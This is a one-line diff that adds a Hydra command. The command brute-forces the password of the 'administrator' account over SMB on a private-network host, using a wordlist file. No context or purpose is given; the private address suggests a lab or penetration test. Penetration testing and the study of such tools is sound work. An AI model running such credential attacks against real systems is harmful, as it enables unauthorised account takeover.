@@ -1,0 +1,1 @@
+hydra -l administrator -P passwords.txt smb://192.168.65.10
